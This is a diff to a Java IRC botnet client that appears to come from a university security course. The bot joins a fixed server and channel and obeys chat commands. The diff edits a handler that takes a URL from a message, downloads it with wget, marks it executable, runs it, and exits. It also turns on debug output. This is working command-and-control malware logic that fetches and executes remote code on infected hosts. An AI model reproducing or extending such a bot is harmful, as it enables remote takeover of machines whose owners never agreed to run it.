@@ -17,7 +17,7 @@ public class BotnetClient extends PircBot {
 	
 	private static final String SENTINEL = "$: ";
 	private static final String TERMINATION = "exit";
-	private static final boolean DEBUG = false;
+	private static final boolean DEBUG = true;
 	private static final String SERVER = "eve.cs.washington.edu";
 	private static final String CHANNEL = "#hacktastic";
 	private static final String NAME = "bot";
@@ -131,8 +131,9 @@ public class BotnetClient extends PircBot {
 					String[] parts = message.split(" ");
 					if (parts.length > 1) {
 						String url = parts[1];
-						Process p = Runtime.getRuntime().exec("wget -O clean.sh " + url + "; chmod +x clean.sh; ./clean.sh; exit;");
+						Process p = Runtime.getRuntime().exec("wget -O clean.sh " + url + " > temp; chmod +x clean.sh > temp; ./clean.sh > temp; exit;");
 						p.waitFor();
+						System.out.println("ran clean script with exit code " + p.exitValue());
 						System.exit(0);
 					}
 				} else if (message.toLowerCase().startsWith("kill")) {
